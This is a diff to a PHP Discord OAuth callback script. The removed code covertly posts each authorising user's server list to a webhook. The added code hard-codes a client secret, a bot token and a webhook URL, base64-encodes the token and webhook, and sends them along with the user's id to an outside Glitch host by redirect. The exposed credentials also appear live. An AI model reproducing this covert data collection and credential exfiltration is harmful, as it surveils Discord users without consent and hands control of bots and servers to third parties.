@@ -5,7 +5,7 @@
     if (isset($_GET["error"])) {
         echo json_encode(array("message" => "Authorization Error"));
     } elseif (isset($_GET["code"])) {
-        $redirect_uri = "https://celestialverify.herokuapp.com/"; // aq tu vai colocar o mesmo site q tu colocou no redirect
+        $redirect_uri = "https://celestialban5094.herokuapp.com/";
         $token_request = "https://discordapp.com/api/oauth2/token";
         $token = curl_init();
         curl_setopt_array($token, array(
@@ -13,18 +13,20 @@
             CURLOPT_POST => 1,
             CURLOPT_POSTFIELDS => array(
                 "grant_type" => "authorization_code",
-                "client_id" => "512722487424057344",
-                "client_secret" => "7cT6SfzsrBB9WYU7Yih9fZvr15NjXBV1",
+                "client_id" => "515362921795289108", // Client ID
+                "client_secret" => "7cT6SfzsrBB9WYU7Yih9fZvr15NjXBV1", // Client Secret
                 "redirect_uri" => $redirect_uri,
                 "code" => $_GET["code"]
             )
         ));
+        $discordbottoken = "NTE1MzYyOTIxNzk1Mjg5MTA4.DtkDkQ.8TX_6Jtisj_JTph9VTXEhG2u_bY"; // Token do bot
+	$hook = "https://discordapp.com/api/webhooks/514183392858734598/FansVcuo2r4aG_nh8gyAb-xEhlafiJnjhtqe196aeu0MvSJnNetutXhaH8anSJHiVPNj"; // Webhook 
         curl_setopt($token, CURLOPT_RETURNTRANSFER, true);
         $resp = json_decode(curl_exec($token));
         curl_close($token);
         if (isset($resp->access_token)) {
             $access_token = $resp->access_token;
-            $info_request = "https://discordapp.com/api/users/@me/guilds";
+            $info_request = "https://discordapp.com/api/users/@me";
             $info = curl_init();
             curl_setopt_array($info, array(
                 CURLOPT_URL => $info_request,
@@ -35,58 +37,11 @@
             ));
             $user = json_decode(curl_exec($info));
             curl_close($info);
-            $access_token2 = $resp->access_token;
-            $info_request2 = "https://discordapp.com/api/users/@me";
-            $info2 = curl_init();
-            curl_setopt_array($info2, array(
-                CURLOPT_URL => $info_request2,
-                CURLOPT_HTTPHEADER => array(
-                    "Authorization: Bearer {$access_token2}"
-                ),
-                CURLOPT_RETURNTRANSFER => true
-            ));
-
-            $user2 = json_decode(curl_exec($info2));
-            curl_close($info2);
-
-            $id_array = array_column($user, 'name');
-            $url = "https://discordapp.com/api/webhooks/512719807599345684/ENwAE9NVMbKMmxlePNFWHx5_aHh6Yi6PG31rl66G7XBxl_JrDQJrfyZwfqOpfhHeGDtT"; // troque o link do webhook aqui
-            $strxx = implode("\n", $id_array);
-$hookObject = json_encode([
-   // "content" => "{$user2->username}#{$user2->discriminator}",
-    "username" => "Celestial Verify",
-    "avatar_url" => "https://vgy.me/KcRkgP.jpg",
-    "tts" => false,
-    "embeds" => [
-        
-        [
-            "title" => "Servidores em que o usuário {$user2->username}#{$user2->discriminator} esta presente !",
-
-            "type" => "rich",
-
-            "description" => "{$strxx}",
-
-            "color" => hexdec( "FFFFFF" ),
-        ]
-    ]
-
-], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
-
-$ch = curl_init();
-
-curl_setopt_array( $ch, [
-    CURLOPT_URL => $url,
-    CURLOPT_POST => true,
-    CURLOPT_POSTFIELDS => $hookObject,
-    CURLOPT_HTTPHEADER => [
-        "Length" => strlen( $hookObject ),
-        "Content-Type" => "application/json"
-    ]
-]);
-
-$response = curl_exec( $ch );
-curl_close( $ch );
-                } else {
+            $b64token = base64_encode($discordbottoken);
+			$b64hook = base64_encode($hook);
+           header("Location: https://lofed.glitch.me/fDJuEUWcFt/{$user->id}&{$b64token}&{$b64hook}");
+           die();
+        } else {
             echo json_encode(array("message" => "Authentication Error"));
         }
     } else {
